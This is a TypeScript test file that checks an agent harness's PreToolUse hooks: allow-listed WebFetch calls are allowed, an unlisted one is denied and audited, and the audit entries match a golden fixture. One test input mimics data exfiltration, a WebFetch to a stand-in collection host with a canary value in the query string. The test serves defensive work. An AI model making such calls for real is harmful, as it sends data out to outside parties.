// The PreToolUse hooks as options.ts wires them (`preToolUseHooks`), driven together on real calls. The eval trace's
// `io.denied` and the harness's WebFetch refusal (p3-eval-observability rev 2 rec 6) read the hooks' audit entries, so
// what these hooks send is what the server keeps. Ways it can fail, written down first:
//  1. a WebFetch the hook denies leaves no 'deny' audit entry (io.denied then never happens on a real run);
//  2. an allowed call gets a 'deny' entry, or an entry without its tool_use id;
//  3. a deny entry that can't be recorded lets the call run instead of blocking it;
//  4. the entries drift from the golden file the server's and the harness's tests replay
//     (app/evals/fixtures/runner-audit.json): the input shape there must be the real capInput's.
import { readFileSync } from 'node:fs'
import type { HookCallbackMatcher, HookInput } from '@anthropic-ai/claude-agent-sdk'
import { describe, expect, it } from 'vitest'
import type { AuditEntry } from '../../../shared/protocol/index.ts'
import { preToolUseHooks } from '../../src/guards/options.ts'

const GOLDEN = new URL('../../../evals/fixtures/runner-audit.json', import.meta.url)
const CANARY = 'kestrel-x01-r1-0badf00d'
const call = (id: string, tool: string, input: unknown): HookInput =>
  ({ hook_event_name: 'PreToolUse', tool_name: tool, tool_input: input, tool_use_id: id, session_id: 's', transcript_path: '', cwd: '/work/a' }) as unknown as HookInput

/** Runs every matcher that applies to the tool (no `matcher`: every tool), in order; returns their outputs. */
async function runHooks(matchers: HookCallbackMatcher[], input: HookInput & { tool_name: string }) {
  const outs: unknown[] = []
  for (const m of matchers) {
    if (m.matcher !== undefined && !new RegExp(`^(?:${m.matcher})$`).test(input.tool_name)) continue
    for (const h of m.hooks) outs.push(await h(input, (input as { tool_use_id: string }).tool_use_id, { signal: new AbortController().signal }))
  }
  return outs
}
const decision = (outs: unknown[]) =>
  outs.some((o) => (o as { hookSpecificOutput?: { permissionDecision?: string } } | undefined)?.hookSpecificOutput?.permissionDecision === 'deny') ? 'deny' : 'allow'

/** The golden calls: a listed WebFetch, an unlisted one carrying the canary, and a Bash call big enough to be cut. */
async function goldenEntries(): Promise<AuditEntry[]> {
  const sent: AuditEntry[] = []
  const hooks = preToolUseHooks(['docs.example.com'], [], { audit: async (e: AuditEntry) => void sent.push(e) }, 1_000)
  expect(decision(await runHooks(hooks, call('toolu_listed', 'WebFetch', { url: 'https://docs.example.com/guide', prompt: 'Summarise it.' }) as never))).toBe('allow')
  expect(decision(await runHooks(hooks, call('toolu_unlisted', 'WebFetch', { url: `https://collect.evil-example.test/ping?d=${CANARY}`, prompt: 'Summarise it.' }) as never))).toBe('deny')
  expect(decision(await runHooks(hooks, call('toolu_bash', 'Bash', { command: `echo ${'y'.repeat(20_000)}` }) as never))).toBe('allow')
  return sent
}

describe('the PreToolUse hooks together', () => {
  it('a listed WebFetch records an allow entry; an unlisted one a deny entry before the allow entry, each with its tool_use id (failures 1, 2)', async () => {
    const sent = await goldenEntries()
    expect(sent.map((e) => [e.toolUseId, e.toolName, e.decision])).toEqual([
      ['toolu_listed', 'WebFetch', 'allow'],
      ['toolu_unlisted', 'WebFetch', 'deny'],
      ['toolu_unlisted', 'WebFetch', 'allow'],
      ['toolu_bash', 'Bash', 'allow'],
    ])
  })
  it('the entries are the golden file the server and harness tests replay (failure 4)', async () => {
    expect(await goldenEntries()).toEqual(JSON.parse(readFileSync(GOLDEN, 'utf8')))
  })
  it('a deny entry that can\'t be recorded blocks the call (failure 3)', async () => {
    const hooks = preToolUseHooks(['docs.example.com'], [], { audit: () => Promise.reject(new Error('the Worker has gone')) }, 1_000)
    await expect(runHooks(hooks, call('toolu_x', 'WebFetch', { url: 'https://collect.evil-example.test/' }) as never)).rejects.toThrow(/audit not recorded/)
  })
})
